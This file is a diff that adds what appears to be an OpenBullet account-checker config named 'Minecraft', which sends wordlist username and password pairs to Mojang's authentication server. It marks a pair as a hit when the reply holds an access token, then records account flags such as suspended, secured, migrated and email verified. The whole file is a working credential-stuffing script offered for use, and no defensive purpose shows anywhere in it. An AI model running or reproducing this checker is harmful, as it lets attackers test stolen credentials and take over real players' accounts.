@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T00:50:54.4049471+00:00",
+  "AdditionalInfo": "",
+  "Author": "Wizdo",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials." 
+    KEY "errorMessage" 
+PARSE "<SOURCE>" LR "suspended\":" "," -> CAP "Suspended" 
+PARSE "<SOURCE>" LR "blocked\":" ",\"" -> CAP "Blocked" 
+PARSE "<SOURCE>" LR "secured\":" "," -> CAP "Secured" 
+PARSE "<SOURCE>" LR "migrated\":" "," -> CAP "Migrated" 
+PARSE "<SOURCE>" LR "emailVerified\":" "," -> CAP "Email Verified" 
+PARSE "<SOURCE>" LR "legacyUser\":" "," -> CAP "Legacy User" 
